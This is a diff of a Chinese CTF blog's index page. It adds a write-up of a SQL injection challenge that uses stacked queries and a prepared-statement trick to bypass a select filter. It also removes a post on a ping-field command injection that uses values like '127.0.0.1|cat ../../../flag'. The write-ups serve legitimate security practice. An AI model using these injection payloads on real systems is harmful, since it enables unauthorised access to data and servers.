@@ -277,6 +277,124 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-suibianzhu" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/01/30/suibianzhu/" class="article-date">
+      <time datetime="2021-01-30T07:14:19.000Z" itemprop="datePublished">2021-01-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/01/30/suibianzhu/">16-Buu练习[强网杯 2019]随便注</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>打开题目，如下：<br><img src="/2021/01/30/suibianzhu/suibianzhu1.png"><br><b style="color:yellow">（一）常规测试</b></p>
+<p style="color:yellow">1、探测到有无注入</p>
+<ul>
+<li>1'   报错
+</li><li>1'#  正常且为True
+</li><li>1' and 1=1#  正常且为True
+</li><li>1' and 1=2#  正常且为False
+</li></ul>
+可以得知存在注入，并且参数使用单引号闭合。
+<p style="color:yellow">2、尝试获取列数</p>
+<ul>
+<li>1' order by 1#
+</li><li>1' order by 2#
+</li><li>1' order by 3#  报错
+</li></ul>
+得出列数为2
+<p style="color:yellow">3、尝试获取数据库名，用户名的基本信息</p>
+试试union查询
+<ul>
+<li>1'union select 1,2#
+</li></ul>
+
+<p>结果如下：<br><img src="/2021/01/30/suibianzhu/suibianzhu2.png"><br>这里过滤了select，也没有发现绕过select的地方<br><b style="color:yellow">（二）花式注入</b></p>
+<p style="color:yellow">1、获取数据库</p>
+<ul>
+<li>?inject=1';show databases;--+
+</li></ul>
+
+<p><img src="/2021/01/30/suibianzhu/suibianzhu3.png"></p>
+<p style="color:yellow">2、获取数据表</p>
+<ul>
+<li>?inject=1';show tables;--+
+</li></ul>
+
+<p><img src="/2021/01/30/suibianzhu/suibianzhu4.png"></p>
+<p style="color:yellow">3、查看列信息</p>
+<ul>
+<li>?inject=1';show columns from `1919810931114514`; --+
+</li></ul>
+
+<p><img src="/2021/01/30/suibianzhu/suibianzhu5.png"></p>
+<p><b>绕过select：</b><br>如果无法使用select，还是获得不了flag，可以通过预编译的方式绕过对select的限制。</p>
+<p>SQL 语句的执行处理<br>1、即时 SQL<br>　　一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：</p>
+<p>　　1. 词法和语义解析；<br>　　2. 优化 SQL 语句，制定执行计划；<br>　　3. 执行并返回结果；<br>如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。</p>
+<p>2、预处理 SQL<br>　　但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>　　所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。<br>　　预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。<br><b>预处理流程:</b></p>
+<ul>
+<li>SET;                                    # 用于设置变量名和值
+</li><li>PREPARE stmt_name FROM preparable_stmt;    # 用于预备一个语句，并赋予名称，以后可以引用该语句
+</li><li>EXECUTE stmt_name;                         # 执行语句
+</li><li>{DEALLOCATE | DROP} PREPARE stmt_name;    # 用来释放掉预处理的语句
+</li></ul>
+
+<p><b>构建payload：</b></p>
+<ul>
+<li>-1';
+</li><li>set @sql=CONCAT('se','lect * from `1919810931114514`;');
+</li><li>prepare stmt from @sql;
+</li><li>execute stmt;
+</li></ul>
+
+<p><img src="/2021/01/30/suibianzhu/suibianzhu6.png"><br>暗示set与prepare关键词被拦截，但是strstr函数对大小写敏感，尝试使用大写绕过：<br>-1’;<br>Set @sql=CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);<br>Prepare stmt from @sql;<br>execute stmt;#<br><img src="/2021/01/30/suibianzhu/suibianzhu7.png"><br>得到flag！<br>查看大佬的博客，使用1’ or 1=1#即可查询出flag，淦！</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-cat" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1145,64 +1263,6 @@ X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连�
  </li></ul>
 <img src="/2021/01/21/hhh/eeee6.png">
 <br>成功拿到flag~~
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-exec" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/01/20/exec/" class="article-date">
-      <time datetime="2021-01-20T10:17:01.000Z" itemprop="datePublished">2021-01-20</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/01/20/exec/">6-buu练习[ACTF2020 新生赛]Exec</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>打开题目，发现是ping，和linux有关，首先查看文件：<b>127.0.0.1|ls</b><br><img src="/2021/01/20/exec/eee1.png"><br>存在index.php文件，那我们查看该文件：<b>127.0.0.1;cat index.php</b><br>再查看源代码，如下：<br><img src="/2021/01/20/exec/eee2.png"><br>没有flag文件，那么flag应该在父目录中，那我们：<b>127.0.0.1|ls ../</b> 直到<b>127.0.0.1|ls ../../../</b>可以看到flag文件<br><img src="/2021/01/20/exec/eee3.png"><br>那我们查看../../../flag文件：<b>127.0.0.1|cat ../../../flag</b><br><img src="/2021/01/20/exec/eee4.png"><br>得到flag！<br>（又是爱学习的一天！！）</p>
-
       
     </div>
     
